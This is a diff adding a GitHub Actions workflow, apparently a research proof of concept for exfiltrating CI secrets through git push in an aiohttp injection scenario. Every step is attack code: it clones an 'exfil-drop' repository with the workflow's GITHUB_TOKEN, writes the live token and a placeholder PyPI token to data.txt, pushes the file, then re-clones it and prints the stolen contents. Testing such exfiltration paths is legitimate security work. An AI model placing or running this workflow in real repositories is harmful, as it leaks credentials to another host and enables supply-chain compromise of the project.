@@ -1,0 +1,47 @@
+name: "#2 aiohttp — git push exfil (mechanism test)"
+on: workflow_dispatch
+
+permissions:
+  contents: write
+
+jobs:
+  test-aiohttp:
+    name: "aiohttp — git push exfil"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Simulate injection: clone exfil-drop, write secrets, push"
+        run: |
+          echo "=== Phase 1: Clone exfil-drop ==="
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/exfil 2>&1
+          echo ""
+          echo "=== Phase 2: Write stolen secrets ==="
+          echo "pypi_token=fake-pypi-token-12345" > /tmp/exfil/data.txt
+          echo "github_token=${GITHUB_TOKEN}" >> /tmp/exfil/data.txt
+          echo "timestamp=$(date -u)" >> /tmp/exfil/data.txt
+          echo "Written to data.txt"
+          echo ""
+          echo "=== Phase 3: Push to exfil-drop ==="
+          cd /tmp/exfil
+          git config user.email "test@test.com"
+          git config user.name "test"
+          git add .
+          git commit -m "exfil data" 2>&1
+          git push 2>&1 && echo "SUCCESS: pushed to exfil-drop" || echo "FAIL: push failed (token scope issue)"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: "Verify: re-clone and check"
+        run: |
+          rm -rf /tmp/check
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/check 2>/dev/null || true
+          if [ -f /tmp/check/data.txt ]; then
+            echo "SUCCESS: data.txt found in exfil-drop"
+            echo "=== Contents ==="
+            cat /tmp/check/data.txt
+          else
+            echo "FAIL: data.txt not in exfil-drop"
+          fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
